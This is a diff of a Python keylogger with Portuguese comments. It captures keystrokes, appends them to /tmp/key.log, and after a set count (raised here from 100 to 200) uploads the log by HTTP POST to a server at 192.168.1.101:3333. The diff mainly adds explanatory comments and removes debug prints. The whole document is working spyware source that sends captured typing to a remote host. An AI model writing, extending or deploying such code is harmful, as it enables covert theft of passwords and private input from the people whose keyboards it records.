@@ -7,15 +7,24 @@ import re
 import requests
 import os
 
-MAX_TECLAS = 100
+# Maximo de teclas
+MAX_TECLAS = 200
+
+# Contador
 teclados = 0
+
+# url do servidor para receber o arquivo com o protocolo http, uma observação é o nome d
+# campo (field) que no caso chamei de recfile
+
 url = 'http://192.168.1.101:3333/upload'
+
+# path do arquivo de log
 arquivolog = "/tmp/key.log"
 
+
 def sendFiles():
-    global teclados
+    global teclados # necessario para poder modificar um valor global
     teclados += 1
-    print(teclados)
     if teclados > MAX_TECLAS:
         files = { 'recfile' : ('key.log', open("/tmp/key.log", "rb"))}
         response = requests.post(url, files=files);
@@ -25,6 +34,7 @@ def sendFiles():
 # setando caminho do arquivo
 
 #  tratando e salvando valor em arquivo
+
 def capturar(tecla):
     sendFiles()
     tecla = str(tecla)
@@ -32,7 +42,6 @@ def capturar(tecla):
     tecla = re.sub(r'Key.space', ' ', tecla)
     tecla = re.sub(r'Key.enter', '\n', tecla)
     tecla = re.sub(r'Key.*', '', tecla)
-    print(tecla)
     with open(arquivolog, "a") as log:
         log.write(tecla)
 
